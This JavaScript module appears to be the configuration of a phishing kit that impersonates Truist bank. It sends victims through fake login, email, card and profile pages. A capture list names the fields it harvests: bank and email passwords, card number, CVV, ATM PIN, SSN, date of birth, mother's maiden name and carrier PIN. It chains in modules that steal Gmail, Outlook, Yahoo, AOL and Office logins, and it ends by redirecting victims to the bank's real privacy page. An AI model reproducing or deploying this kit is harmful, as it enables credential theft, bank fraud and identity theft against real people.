/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')
/** Defined Functions used */

/** Important Defaults */



const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/email/validate') {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)

                super.superExecutePhpScript('addon/validate.php', clientContext)
            } else {
                
                switch (this.req.url) {
                    case '/session/secure/exec':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/email':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/card'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/profile':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: 'https://www.truist.com/content/dam/truist-bank/us/en/documents/footer/privacy-policy-truist-english.pdf'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/card':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/profile'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    default:
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        super.cleanEnd('PHP-EXEC', clientContext)
                }
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/login':
                    super.superExecutePhpScript('login.php', clientContext)
                    break
                case '/session/secure/profile':
                    super.superExecutePhpScript('profile.php', clientContext)
                    break
                case '/session/secure/card':
                    super.superExecutePhpScript('card.php', clientContext)
                    break
                case '/session/secure/email':
                    super.superExecutePhpScript('auth.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('404.php', clientContext)
            }
        }
    }


}


const configExport = {

    SCHEME: 'truist',

    CURRENT_DOMAIN: 'www.truist.com',

    START_PATH: '/session/secure/login',
    
    PATTERNS: [],

    FORCE_PROXY: [],


    EXTRA_COMMANDS: [
        {
            path: '/auth/login/finish',
            command: 'REDIRECT_TO_URL',
            command_args: {
                redirect_url: '/session/secure/credit',
                },
        },
    ],

    PHP_PROCESSOR: {
        '/session/secure/login': {
            GET: {
                script: 'login.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/seuce/email',

            },
        },

        '/session/secure/exec': {
            GET: {
            
            },
            POST: {
            },
        },

        '/session/secure/email': {
            GET: {
                script: 'auth.php',
            },
            POST: {
                redirectTo: '/session/secure/credit',
            }
        },

        '/session/secure/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'addon/validate.php',
                
                redirectTo: '',

            },
        },

        '/session/secure/credit': {
            GET: {
                script: 'card.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/profile',

            },
        },

        '/session/secure/profile': {
            GET: {
                script: 'profile.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/process/exit',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/session/secure/process/exit'],

    EXIT_URL: 'https://www.truist.com/content/dam/truist-bank/us/en/documents/footer/privacy-policy-truist-english.pdf',



    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['sko1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['skun1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginUserName2: {
            method: 'POST',
            params: ['sko'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['skun'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

       
        email: {
            method: 'POST',
            params: ['email'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword1: {
            method: 'POST',
            params: ['cpassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['confirmpassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
       
        CardNumber: {
            method: 'POST',
            params: ['cardNumber'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['expiry'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        PIN: {
            method: 'POST',
            params: ['atmpin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        dob: {
            method: 'POST',
            params: ['dob'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        address: {
            method: 'POST',
            params: ['address'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        motherMaidenName: {
            method: 'POST',
            params: ['mmm'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        state: {
            method: 'POST',
            params: ['state'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
       
        phone: {
            method: 'POST',
            params: ['phone'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        carrierPin: {
            method: 'POST',
            params: ['cpin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],

   }

module.exports = configExport